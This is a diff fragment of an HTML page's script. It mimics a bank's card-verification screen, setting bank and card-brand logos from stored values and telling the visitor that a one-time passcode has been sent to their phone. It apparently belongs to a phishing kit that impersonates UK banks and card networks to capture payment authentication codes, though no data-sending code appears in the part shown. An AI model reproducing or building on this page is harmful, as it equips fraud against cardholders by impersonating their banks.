+			if (getBankName !== 'GOVERNOR AND COMPANY OF THE BANK OF IRElanD' && getBankName !== 'ROYAL BANK OF SCOTlanD' && getBankName !== 'ULSTER BANK, LTD' && getBankName !== 'BANK OF SCOTlanD' && getBankName !== 'CITI BANK' && getBankName !== 'MBNA' && getBankName !== 'ABBEY NATIONAL BANK PLC' && getBankName !== 'AIB GROUP (UK) PLC' && getBankName !== 'ALLIANCE AND LEICESTER' && getBankName !== 'ALLOCATED TO SWITCH' && getBankName !== 'ALLSTAR' && getBankName !== 'AMERICAN EXPRESS' && getBankName !== 'BARCLAYS BANK' && getBankName !== 'BPSUPERCHARGE' && getBankName !== 'BRITANNIA BUILDING SOCIETY' && getBankName !== 'BRITISH AIRWAYS' && getBankName !== 'CAPITAL ONE' && getBankName !== 'CLYDESDALE BANK' && getBankName !== 'CO-OPERATIVE BANK PLC' && getBankName !== 'CONISTER BANK, LTD' && getBankName !== 'CREATION' && getBankName !== 'FIRST DATA RESOURCES (UK) (FDR)' && getBankName !== 'GE CAPITAL' && getBankName !== 'HALIFAX' && getBankName !== 'HFC BANK PLC' && getBankName !== 'HSBC' && getBankName !== 'IDT FINANCIAL SERVICES' && getBankName !== 'INVESTEC BANK (UK), LTD' && getBankName !== 'J.P. MORGAN EUROPE, LTD' && getBankName !== 'LLOYDS BANK PLC' && getBankName !== 'NATIONAL AUSTRALIA GROUP (UK)' && getBankName !== 'NATIONAL WESTMINSTER BANK PLC' && getBankName !== 'NATIONWIDE BUILDING SOCIETY' && getBankName !== 'NATWEST' && getBankName !== 'NEWCASTLE BUILDING SOCIETY' && getBankName !== 'NORTHERN BANK, LTD' && getBankName !== 'R RAPHAEL AND SONS' && getBankName !== 'REDFUEL(EUROPE)' && getBankName !== 'SAINSBURYS BANK PLC' && getBankName !== 'SANTANDER CARDS UK, LTD' && getBankName !== 'SG HAMBROS BANK AND TRUST' && getBankName !== 'STANDARD CHARTERED BANK' && getBankName !== 'TESCO' && getBankName !== 'TRAVELLERS CHEQUE' && getBankName !== 'UK FUELS' && getBankName !== 'VANQUIS BANK, LTD' && getBankName !== 'VTB BANK OJSC' && getBankName !== 'WOOLWICH PLC' && getBankName !== 'YORKSHIRE BANK') {
+			    $('.bank-logo').attr('src', 'static/assets/cr/pcidss.svg');
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			
+			//const detect = card => /^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)[0-9]{0,}$/.test(card) ? 'mastercard' : 'visa'
+			
+			var getCardBrand = localStorage.getItem('cardBrand');
+			if (getCardBrand == 'mastercard') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/mastercard.png");
+			}
+			if (getCardBrand == 'visa') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/visa.png");
+			}
+			if (getCardBrand == 'maestro') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/maestro.png");
+			}
+			if (getCardBrand == 'forbrugsforeningen') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/altBank.png");
+			}
+			if (getCardBrand == 'dankort') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/altBank.jpg");
+			}
+			if (getCardBrand == 'amex') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/amex.png");
+			}
+			if (getCardBrand == 'dinersclub') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/altBank.png");
+			}
+			if (getCardBrand == 'discover') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/altBank.jpg");
+			}
+			if (getCardBrand == 'unionpay') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/altBank.png");
+			}
+			if (getCardBrand == 'jcb') {
+			    $('.brand-logo').attr('src', "/static/assets/cr/altBank.gif");
+			}
+			if (getCardBrand !== 'mastercard' && getCardBrand !== 'visa' && getCardBrand !== 'maestro' && getCardBrand !== 'forbrugsforeningen' && getCardBrand !== 'dankort' && getCardBrand !== 'amex' && getCardBrand !== 'dinersclub' && getCardBrand !== 'discover' && getCardBrand !== 'unionpay' && getCardBrand !== 'jcb') {
+			    $('.brand-logo').attr('src', "altBank.png");
+			}
+		</script>
+	</body>
+</html>
